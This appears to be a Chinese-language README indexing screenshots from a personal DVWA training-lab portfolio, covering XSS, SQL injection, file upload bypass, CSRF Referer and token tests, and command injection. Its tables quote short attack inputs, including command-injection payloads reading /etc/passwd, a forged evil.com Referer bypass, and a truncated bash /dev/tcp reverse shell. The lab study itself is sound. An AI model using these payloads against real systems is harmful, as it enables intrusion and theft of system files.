# 截图说明

目录：`02-DVWA-Web漏洞实战/screenshots/`

所有截图来自本地 DVWA 靶场（Kali，`192.168.59.128`），**只对自己的实验环境测试**。

## Web 漏洞

| 编号 | 文件 | 对应文档 | 说明 |
|---|---|---|---|
| 01 | 01-反射型XSS-弹窗.png | XSS三种类型.md | 反射型 XSS 弹窗 |
| 02 | 02-存储型XSS-刷新后仍弹.png | XSS三种类型.md | 存储型，刷新后仍执行 |
| 03 | 03-DOM型XSS-F12脚本位置.png | XSS三种类型.md | DOM 型，payload 在 script 标签内 |
| 04 | 04-窃取Cookie-接收端日志.png | XSS三种类型.md | 存储型 XSS 偷 Cookie 到监听端 |
| 05 | 05-SQL注入-报错确认注入点.png | SQL注入.md | 单引号报错，确认注入点 |
| 06 | 06-SQL注入-union取库名.png | SQL注入.md | `union select database(),user()` |
| 07 | 07-文件上传-Low-getshell.png | 文件上传绕过.md | Low 直接上传 PHP 并执行 |
| 08 | 08-文件上传-Medium-Burp改ContentType.png | 文件上传绕过.md | Burp 改 Content-Type 绕过 |

## CSRF

| 编号 | 文件 | 说明 |
|---|---|---|
| 09 | CSRF_三种Referer场景.png | **示意图**（自己画的）：三种 Referer 来源及通过/拦截结果 |
| 10 | 10-CSRF-Medium-Referer拦截.png | `Referer: http://evil.com/` → `That request didn't look correct.` |
| 11 | 11-CSRF-Medium-子域名绕过成功.png | `Referer: http://192.168.59.128.evil.com/` → **`Password Changed.`（绕过成功）** |
| 12 | 12-CSRF-High-带Token请求.png | 拦截到的请求，第 1 行带 `user_token=...` |
| 13 | 13-CSRF-High-Token重放失败.png | 用已消耗的 token 重放 → 302 → `CSRF token is incorrect` |
| 14 | 14-CSRF-High-首次成功.png | 第一次提交（token 有效）→ `Password Changed.` |

> **10 vs 11 vs 14 是核心对比**：Medium 下同一条请求，只改 Referer 一个字段，结果就从"拦截"变成"成功"——说明 Referer 判断可被绕过；High 下第一次成功、第二次重放就失败——说明 Token 一次性有效。

## 命令执行

| 编号 | 文件 | 说明 |
|---|---|---|
| 15 | 15-命令执行-Low-分号whoami.png | `127.0.0.1; whoami` → `www-data` |
| 16 | 16-命令执行-Low-读passwd.png | `127.0.0.1; cat /etc/passwd \| head -5` |
| 17 | 17-命令执行-Medium-单与号绕过.png | `127.0.0.1 & whoami`（Medium 只过滤 `&&`） |
| 18 | 18-命令执行-High-竖线绕过.png | `127.0.0.1\|whoami`（High 黑名单是 `'\| '` 带空格） |
| 19a | 19a-反弹shell-完整payload.png | 地址栏里 `bash -i >& /dev/tcp/...` 完整 payload |
| 19b | 19b-反弹shell-nc收到shell.png | nc 收到 `www-data@kali` 的 shell |
| 20 | 20-命令执行-High-黑名单源码.png | `$substitutions` 数组，能看到 `'\| '` 带空格 |

---

## 命名规范

```
<编号>-<漏洞类型>-<难度>-<关键动作>.png
```

例如 `18-命令执行-High-竖线绕过.png`。

**命名比截图本身重要**——面试官翻目录时，看文件名就知道你测了什么。
